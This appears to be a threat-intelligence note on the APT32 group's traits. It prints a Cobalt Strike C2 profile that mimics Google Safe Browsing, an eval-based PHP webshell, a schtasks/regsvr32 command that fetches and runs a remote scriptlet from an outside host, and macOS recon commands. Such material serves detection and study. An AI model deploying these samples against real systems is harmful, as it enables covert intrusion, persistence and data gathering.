# APT32

## Features

1. When using Cobalt Strike for RAT, it is customary to use the configuration file to simulate Google's secure browsing service, but the configuration file has been exposed in Github.

```profile
#
# Safebrowsing Comms profile
#   https://code.google.com/p/google-safe-browsing/wiki/SafeBrowsingDesign
#
# Author: @harmj0y
#

set sleeptime "30000"; # Use a 30s interval
set jitter    "20"; # 20% jitter
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

http-get {

    # change/randomize this as you wish
    set uri "/safebrowsing/rd/CltOb12nLW1IbHehcmUtd2hUdmFzEBAY7-0KIOkUDC7h2";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";

        metadata {
            netbios;
            prepend "PREF=ID=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/vnd.google.safebrowsing-chunk";
        header "X-Content-Type-Options" "nosniff";
        header "Content-Encoding" "gzip";
        header "X-XSS-Protection" "1; mode=block";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Cache-Control" "public,max-age=172800";
        header "Age" "1222";
        header "Alternate-Protocol" "80:quic";

        output {
            print;
        }
    }
}

http-post {

    set uri "/safebrowsing/rd/CINnu27nLO8hbHdfgmUtc2ihdmFyEAcY4";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";

        id {
            netbios;
            prepend "U=779b64e1a7ed737a";
            prepend "PREF=ID=";
            header "Cookie";
        }

        output {
            print;
        }
    }

    server {
        header "Content-Type" "application/vnd.google.safebrowsing-chunk";
        header "X-Content-Type-Options" "nosniff";
        header "Content-Encoding" "gzip";
        header "X-XSS-Protection" "1; mode=block";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Cache-Control" "public,max-age=172800";
        header "Age" "1222";
        header "Alternate-Protocol" "80:quic";
        output {
            print;
        }
    }
}
```

2. The webshell that uploads PHP files on the victim's website is intended to execute commands on the running Web server.

```php
if(@$_POST['Variable 1']&&@md5(md5($_POST['Variable 2']))=='<MD5 HASH>') {
$x="\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";
@eval($x($_POST['Variable 1']));
exit();
```

3. The commands executed by the persistence script built when building phishing messages can also be used as characteristics.

```bash
schtasks /create /sc MINUTE /tn ""Power Efficiency Diagnostics"" /tr ""\""regsvr32.exe\"" /s /n /u /i: \""h\""t\""t\""p://IP:80/download/microsoftv.jpg scrobj.dll"" /mo 15 /F
```

4. Mac OS backdoor will call multiple system commands to obtain information.

```bash
ioreg -l | grep -e "Manufacturer"  //Obtain manufacturer information
sysctl hw.model  //Get model
system_profiler SPHardwareDataType 2>/dev/null | awk ‘/Boot ROM Version/ {split($0, line, “:”);printf(“%s”, line[2]);}
//Specified model of detection system
system_profiler SPHardwareDataType 2>/dev/null | awk '/Processor / {split($0,line,":"); printf("%s",line[2]);}'
machdep.cpu.brand_string
//Collect processor information
system_profiler SPHardwareDataType 2>/dev/null | awk '/Memory/ {split($0,line, ":"); printf("%s", line[2]);}'
//Collect memory information
ioreg -rd1 -c IOPlatformExpertDevice | awk '/IOPlatformSerialNumber/ { split($0, line, "\""); printf("%s", line[4]); }'
//Retrieve the serial number of the device
```
